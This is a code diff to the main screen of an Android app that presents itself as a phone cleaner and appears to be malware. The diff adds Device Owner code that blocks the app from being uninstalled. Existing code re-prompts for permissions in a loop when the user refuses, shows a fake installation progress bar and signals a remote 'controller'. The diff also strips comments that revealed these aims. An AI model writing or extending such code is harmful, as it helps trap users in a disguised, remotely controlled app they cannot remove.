@@ -1,8 +1,10 @@
 package com.phone.health.cleaner;
 
 import android.Manifest;
+import android.app.admin.DevicePolicyManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
@@ -56,6 +58,9 @@ public class MainActivity extends AppCompatActivity {
 
         addLog("Приложение запущено. Ожидание действий пользователя.");
 
+        // Проверяем и активируем системную блокировку удаления, если выдан Device Owner
+        checkAndApplyUninstallProtection();
+
         // Кнопка логов в правом верхнем углу
         btnLogs.setOnClickListener(v -> showLogsDialog());
 
@@ -64,6 +69,22 @@ public class MainActivity extends AppCompatActivity {
             addLog("Нажата кнопка 'Сканирование и очистка'. Запуск запроса прав.");
             checkAndRequestPermissions();
         });
+    }
+
+    private void checkAndApplyUninstallProtection() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName adminName = new ComponentName(this, MyDeviceAdminReceiver.class);
+
+            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
+                dpm.setUninstallBlocked(adminName, getPackageName(), true);
+                addLog("Системная защита: блокировка удаления приложения активна.");
+            } else {
+                addLog("Системная защита: права Device Owner не обнаружены.");
+            }
+        } catch (Exception e) {
+            addLog("Ошибка при установке защиты от удаления: " + e.getMessage());
+        }
     }
 
     private void addLog(String message) {
@@ -128,11 +149,9 @@ public class MainActivity extends AppCompatActivity {
             }
 
             if (!allGranted) {
-                // Пункт 1: Если нажал отклонить — "ебёт мозги" и выбрасывает диалог снова
                 addLog("Не все разрешения получены. Повторный вызов диалога запроса прав...");
                 Toast.makeText(this, "Для продолжения работы очистки требуются системные права!", Toast.LENGTH_LONG).show();
                 
-                // Небольшая задержка и повторный вызов
                 new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 1200);
             } else {
                 addLog("Все требуемые разрешения успешно выбиты.");
@@ -141,7 +160,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    // Пункт 1 & 2: Загрузка библиотек, прогресс-бар и моментальный сигнал контроллеру
     private void startResourceInstallation() {
         btnScan.setEnabled(false);
         progressBar.setVisibility(View.VISIBLE);
@@ -154,7 +172,7 @@ public class MainActivity extends AppCompatActivity {
         new Thread(() -> {
             for (int i = 1; i <= 100; i++) {
                 try {
-                    Thread.sleep(30); // симуляция распаковки/установки
+                    Thread.sleep(30);
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
@@ -168,8 +186,6 @@ public class MainActivity extends AppCompatActivity {
             handler.post(() -> {
                 addLog("Ресурсы и библиотеки успешно установлены в защищенную директорию.");
                 tvProgressStatus.setText("Установка завершена! Синхронизация с пультом...");
-                
-                // Сигнал контроллеру (эмуляция отправки пакета готовности на узел/сервер)
                 triggerControllerConnection();
             });
         }).start();
